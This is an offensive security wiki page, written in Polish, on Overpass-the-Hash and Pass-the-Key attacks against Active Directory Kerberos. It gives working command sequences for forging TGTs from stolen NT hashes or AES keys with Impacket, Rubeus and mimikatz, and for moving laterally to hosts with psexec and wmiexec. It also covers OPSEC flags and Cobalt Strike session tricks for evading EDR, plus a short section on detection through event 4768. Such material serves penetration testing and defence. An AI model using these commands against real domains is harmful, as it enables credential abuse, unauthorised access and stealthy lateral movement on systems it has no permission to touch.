# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Atak **Overpass The Hash/Pass The Key (PTK)** jest przeznaczony dla środowisk, w których tradycyjny protokół NTLM jest ograniczony, a uwierzytelnianie Kerberos ma pierwszeństwo. Atak ten wykorzystuje hash NTLM albo klucze AES użytkownika do uzyskania biletów Kerberos, umożliwiając nieautoryzowany dostęp do zasobów w sieci.

Ściśle rzecz biorąc:

- **Over-Pass-the-Hash** zwykle oznacza przekształcenie **hasha NT** w Kerberos TGT za pomocą klucza Kerberos **RC4-HMAC**.
- **Pass-the-Key** to bardziej ogólna wersja, w której masz już klucz Kerberos, taki jak **AES128/AES256**, i bezpośrednio prosisz o TGT z jego użyciem.

Ta różnica ma znaczenie w utwardzonych środowiskach: jeśli **RC4 jest wyłączony** albo KDC już go nie zakłada, sam **hash NT nie wystarcza** i potrzebny jest **klucz AES** (albo hasło w postaci jawnej, aby go wyprowadzić).

Aby przeprowadzić ten atak, pierwszym krokiem jest zdobycie hashy NTLM lub hasła konta docelowego użytkownika. Po uzyskaniu tych informacji można zdobyć Ticket Granting Ticket (TGT) dla tego konta, co pozwala atakującemu uzyskać dostęp do usług lub maszyn, do których użytkownik ma uprawnienia.

Proces można rozpocząć za pomocą następujących poleceń:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
W scenariuszach wymagających AES256 można użyć opcji `-aesKey [AES key]`:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` obsługuje również żądanie **service ticket bezpośrednio przez AS-REQ** z `-service <SPN>`, co może być przydatne, gdy chcesz uzyskać ticket dla konkretnego SPN bez dodatkowego TGS-REQ:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Ponadto uzyskany ticket może być użyty z różnymi narzędziami, w tym `smbexec.py` lub `wmiexec.py`, rozszerzając zakres ataku.

Napotkane problemy, takie jak _PyAsn1Error_ lub _KDC cannot find the name_, są zazwyczaj rozwiązywane przez zaktualizowanie biblioteki Impacket lub użycie hostname zamiast adresu IP, co zapewnia zgodność z Kerberos KDC.

Alternatywna sekwencja poleceń z użyciem Rubeus.exe pokazuje kolejny aspekt tej techniki:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Ta metoda odzwierciedla podejście **Pass the Key**, skupiając się na przejęciu i bezpośrednim wykorzystaniu ticketu do celów uwierzytelniania. W praktyce:

- `Rubeus asktgt` wysyła sam **surowy Kerberos AS-REQ/AS-REP** i **nie** wymaga uprawnień administratora, chyba że chcesz wskazać inną sesję logowania za pomocą `/luid` albo utworzyć osobną za pomocą `/createnetonly`.
- `mimikatz sekurlsa::pth` wstrzykuje materiał poświadczeń do sesji logowania i dlatego **dotyka LSASS**, co zwykle wymaga lokalnego admina lub `SYSTEM` i jest bardziej widoczne z perspektywy EDR.

Przykłady z Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Aby dostosować się do operational security i użyć AES256, można zastosować następujące polecenie:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` jest istotny, ponieważ ruch generowany przez Rubeus nieznacznie różni się od natywnego Windows Kerberos. Zwróć też uwagę, że `/opsec` jest przeznaczony dla ruchu **AES256**; używanie go z RC4 zwykle wymaga `/force`, co w dużej mierze mija się z celem, ponieważ **RC4 w nowoczesnych domenach samo w sobie jest silnym sygnałem**.

## Detection notes

Każde żądanie TGT generuje **event `4768`** na DC. W obecnych buildach Windows ten event zawiera więcej przydatnych pól niż sugerują starsze opisy:

- `TicketEncryptionType` mówi, jaki enctype został użyty dla wydanego TGT. Typowe wartości to `0x17` dla **RC4-HMAC**, `0x11` dla **AES128** i `0x12` dla **AES256**.
- Zaktualizowane eventy ujawniają też `SessionKeyEncryptionType`, `PreAuthEncryptionType` oraz advertised enctypes klienta, co pomaga odróżnić **rzeczywistą zależność od RC4** od mylących legacy defaults.
- Zobaczenie `0x17` w nowoczesnym środowisku to dobry trop, że konto, host albo ścieżka fallback KDC nadal dopuszcza RC4, a więc jest bardziej podatna na NT-hash-based Over-Pass-the-Hash.

Microsoft stopniowo ograniczał zachowanie RC4-by-default od listopadowych aktualizacji Kerberos hardening z 2022 roku, a obecnie opublikowana guidance mówi, aby **usunąć RC4 jako domyślnie zakładany enctype dla AD DCs do końca Q2 2026**. Z ofensywnego punktu widzenia oznacza to, że **Pass-the-Key z AES** staje się coraz bardziej niezawodną ścieżką, podczas gdy klasyczny **NT-hash-only OpTH** będzie coraz częściej zawodził w utwardzonych środowiskach.

Więcej informacji o Kerberos encryption types i powiązanym ticketing behaviour znajdziesz tutaj:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Każda logon session może mieć tylko jeden aktywny TGT naraz, więc uważaj.

1. Utwórz nową logon session za pomocą **`make_token`** z Cobalt Strike.
2. Następnie użyj Rubeus, aby wygenerować TGT dla nowej logon session bez wpływu na istniejącą.

Możesz uzyskać podobną izolację bezpośrednio z Rubeus, używając poświęcanej **logon type 9** session:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
To unika nadpisywania bieżącego TGT sesji i zwykle jest bezpieczniejsze niż importowanie ticket do istniejącej sesji logowania.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
